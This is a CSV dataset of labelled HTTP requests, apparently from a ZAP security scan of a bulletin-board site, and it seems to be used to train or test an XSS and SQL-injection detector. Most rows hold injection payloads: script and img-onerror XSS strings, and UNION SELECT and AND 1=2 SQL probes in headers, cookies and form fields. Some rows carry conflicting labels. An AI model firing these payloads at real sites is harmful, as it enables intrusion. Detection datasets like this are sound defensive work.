,id,combined_request,label_x,gpt_label
532,e1b0101b-b751-445c-8c63-fb403fa87a1f,"POST /bbs/write_comment_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&c_id=15&page=1&sod=desc&sop=and&sst=wr_hit&w=c&wr_id=14\r\ncontent-length: 199\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=c&bo_table=free&wr_id=14&comment_id=15&sca=&sfl=&stx=&spt=&page=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&is_good=&wr_content=&wr_name=ZAP&wr_password=ZAP&captcha_key=ZAP&wr_secret=secret",XSS,XSS
533,6115bab5-f311-4d19-8c86-688862e56dd6,"POST /bbs/ajax.filter.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\nContent-Length: 24\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nDNT: 10W45pz4p\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://211.115.206.18:7000\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsubject=&content=1232131",SQL Injection,SQL Injection
534,248225b3-c6a7-4972-8ca9-ccdbf9b569ad,"GET /bbs/_head.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.360W45pz4p\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",normal,normal
535,00998728-5fa9-4068-8ced-f2e7a1afc0fa,"GET /bbs/ajax.autosaveload.php HTTP/1.1\r\nhost: ' <scrIpt>alert(1);</scRipt>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D+AND+1%3D2+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
536,b98afa8d-0e8e-471e-8d16-24600e11a994,"GET /bbs/ HTTP/1.1\r\nhost: </address><scrIpt>alert(1);</scRipt><address>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=ji8i8jos697ud2u8kavt46bln1\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
537,30b9bdac-e7c5-4270-8d9b-4e4d668d3175,"POST /bbs/login_check.php HTTP/1.1\r\nhost:  ><img src=x onerror=prompt()>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/\r\ncontent-length: 72\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nurl=https%3A%2F%2Fzap.example.com&mb_id=ZAP&mb_password=ZAP&auto_login=1",XSS,XSS
538,b92fbf91-927e-4061-8dc0-73fe9f21c192,"GET /bbs/ajax.autosaveload.php?query=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D+AND+1%3D2+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
539,106f724b-fb50-4d61-8e15-de2b95cbb745,"POST /bbs/register_form_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/register_form.php\r\ncontent-length: 314\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=&url=https%3A%2F%2Fzap.example.com&agree=1&agree2=1&cert_type=&cert_no=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&mb_sex=&mb_id=ZAP&mb_password=ZAP&mb_password_re=ZAP&mb_name=ZAP&mb_nick_default=&mb_nick=ZAP&old_email=&mb_email=foo-bar%40example.com&mb_mailling=1&mb_open=1&mb_open_default=&captcha_key=ZAP",XSS,XSS
540,0f4b7dfa-8aa7-4146-8e16-3a2921c49e99,"GET /bbs/ajax.autosaveload.php?query=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D+AND+1%3D2+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
541,91b09d34-0b75-47e5-8e51-c55ff91efe1b,"POST /bbs/board_list_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&page=1&sca&sfl=wr_content&sod=asc&sop=and&sst=wr_datetime&stx=ZAP\r\ncontent-length: 75\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nbo_table=free&sfl=wr_content&stx=ZAP&spt=-7&sst=0W45pz4p&sod=asc&page=1&sw=",normal,SQL Injection
542,3020fec6-8a07-4a0d-8eb2-83e23ee71d3c,GET /bbs/ajax.autosave.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ' <img src=x onerror=prompt()>\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,XSS,XSS
543,fc70080a-3348-41a9-8ec4-2240620ca2a0,"POST /bbs/register_form_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/register_form.php\r\ncontent-length: 314\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=&url=https%3A%2F%2Fzap.example.com&agree=1&agree2=1&cert_type=&cert_no=&mb_sex=&mb_id=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&mb_password=ZAP&mb_password_re=ZAP&mb_name=ZAP&mb_nick_default=&mb_nick=ZAP&old_email=&mb_email=foo-bar%40example.com&mb_mailling=1&mb_open=1&mb_open_default=&captcha_key=ZAP",XSS,XSS
544,ad10b049-aa60-434e-8ee2-53c25fe76250,POST /bbs/write.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: '\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_hit&w=u&wr_id=14\r\ncontent-length: 78\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=u&bo_table=free&wr_id=14&comment_id=&sfl=&stx=&page=0W45pz4p&wr_password=ZAP,normal,XSS
545,e49a4df4-2a91-47e4-8ee4-427d35ef03f9,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=qa&device=pc&w=r&wr_id=3\r\ncontent-length: 1016\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nuid=2023110315225029&w=r&bo_table=qa&wr_id=3&sca=&sfl=&stx=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&spt=&sst=&sod=&page=&wr_name=ZAP&wr_password=ZAP&wr_email=ZAP&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94...%ED%85%8C%EC%8A%A4%ED%8A%B8+%EC%A0%90%EA%B2%80+%EC%9E%85%EB%8B%88%EB%8B%A4.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%94%A8%ED%8B%B0%EC%95%84%EC%9D%B4%EB%9E%A9%0D%0A%3E+%0D%0A%3E+%EB%B3%B4%EC%95%88%EA%B8%B0%EC%88%A0%ED%8C%80%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%3Cscript%3E%0D%0A%3E+++++alert%28%27test%27%29%3B%0D%0A%3E+++++%2F%2F+%EA%B3%B5%EA%B2%A9%EC%9E%90%EB%8A%94+%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98+%EC%84%B8%EC%85%98+%EC%BF%A0%ED%82%A4%EB%A5%BC+%ED%83%88%EC%B7%A8%ED%95%98%EA%B1%B0%EB%82%98+%EB%8B%A4%EB%A5%B8+%EC%95%85%EC%9D%98%EC%A0%81%EC%9D%B8+%EC%9E%91%EC%97%85%EC%9D%84+%EC%88%98%ED%96%89%ED%95%A0+%EC%88%98+%EC%9E%88%EC%9D%8C%0D%0A%3E+%3C%2Fscript%3E%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",XSS,XSS
546,464ef567-17e3-4f19-8ee9-3ed8d91ec601,"POST /bbs/register_form.php?query=%22%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/register.php?device=mobile\r\ncontent-length: 27\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nchk_all=on&agree=1&agree2=1",XSS,XSS
547,60eb2282-8a68-4e3d-8ef7-a1ce112bd242,"POST /bbs/delete_comment.php?token=1698992570654491ba135b0 HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&comment_id=12&page=1&sod=desc&sop=and&sst=wr_datetime&w=x\r\ncontent-length: 77\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=x&bo_table=free&wr_id=0&comment_id=12&sfl=&stx=&page=1&wr_password=0W45pz4p",normal,SQL Injection
548,d9e23662-7a07-4faa-8f02-85f7e14faee9,POST /bbs/delete.php?token=1698992570654491ba1d169 HTTP/1.1\r\nhost:  ><img src=x onerror=prompt()>\r\nuser-agent: ;\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=d&wr_id=4\r\ncontent-length: 70\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=d&bo_table=free&wr_id=4&comment_id=&sfl=&stx=&page=1&wr_password=ZAP,XSS,XSS
549,f1f97ea6-60f1-4f90-8f36-645a744f1282,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=r&wr_id=7\r\ncontent-length: 523\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=r&bo_table=free&wr_id=7&sca=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&sfl=&stx=&spt=%29+UNION+ALL+select+NULL+--+&sst=wr_datetime&sod=desc&page=1&wr_name=ZAP&wr_password=ZAP&wr_email=foo-bar%40example.com&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94..%EA%B0%80%EC%9D%84%EC%9E%85%EB%8B%88%EB%8B%A4.%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",SQL Injection,SQL Injection
550,4881f7d6-9586-424d-8f3f-9947b78c2101,POST /bbs/delete.php?token=1698992570654491ba1d169 HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ;\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=d&wr_id=4\r\ncontent-length: 115\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=d&bo_table=free&wr_id=4&comment_id=&sfl=&stx=&page=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&wr_password=ZAP,XSS,XSS
551,28a7375e-9b89-4a85-8f44-eb11637230d9,"POST /bbs/write_comment_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&c_id=15&page=1&sod=desc&sop=and&sst=wr_hit&w=c&wr_id=14\r\ncontent-length: 196\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=c&bo_table=free&wr_id=14&comment_id=15&sca=&sfl=&stx=&spt=&page=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&is_good=&wr_content=&wr_name=ZAP&wr_password=ZAP&captcha_key=ZAP&wr_secret=secret",XSS,XSS
552,35de191e-493b-49e9-8fb6-f5bd61e5920d,"GET /bbs/_head.sub.php?query=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
553,b9c5625a-1d9b-47ef-8fe0-034bca9e9075,"POST /bbs/board_list_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&page=1&sca&sfl=wr_content&sod=asc&sop=and&sst=wr_datetime&stx=ZAP\r\ncontent-length: 124\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nbo_table=free&sfl=wr_content&stx=ZAP&spt=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&sst=wr_datetime&sod=asc&page=1&sw=",XSS,XSS
554,9d678c9f-828d-4b1e-8fe8-9ee54f6d7ad9,"GET /bbs/ajax.autosave.php HTTP/1.1\r\nhost: ' <scrIpt>alert(1);</scRipt>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
555,54fe9792-07f4-425c-8fee-b9f795fd72aa,"GET /bbs/_common.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/0W45pz4p\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%29+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",SQL Injection,SQL Injection
556,7dfeb761-8ae4-4ac0-8ff9-c4371c58e571,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=r&wr_id=7\r\ncontent-length: 480\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=r&bo_table=free&wr_id=7&sca=&sfl=&stx=&spt=%29+UNION+ALL+select+NULL+--+&sst=wr_datetime0W45pz4p&sod=desc&page=1&wr_name=ZAP&wr_password=ZAP&wr_email=foo-bar%40example.com&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94..%EA%B0%80%EC%9D%84%EC%9E%85%EB%8B%88%EB%8B%A4.%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",SQL Injection,SQL Injection
557,cad26389-71fb-424a-8ffe-73a593043770,"POST /bbs/board_list_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&page=1&sca&sfl&sfl=wr_content&sod=asc&sop=and&sst=wr_datetime&stx&stx=ZAP\r\ncontent-length: 142\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nbo_table=free&sfl=wr_content&stx=ZAP&spt=-7&sca=&sst=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&sod=asc%27+AND+%271%27%3D%271&page=1&sw=",XSS,XSS
558,b71e5dbd-faa4-4681-9009-ee2a4f0383e9,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=r&wr_id=7\r\ncontent-length: 509\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=r&bo_table=free&wr_id=7&sca=&sfl=&stx=&spt=%29+UNION+ALL+select+NULL+--+&sst=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&sod=desc&page=1&wr_name=ZAP&wr_password=ZAP&wr_email=foo-bar%40example.com&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94..%EA%B0%80%EC%9D%84%EC%9E%85%EB%8B%88%EB%8B%A4.%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",SQL Injection,SQL Injection
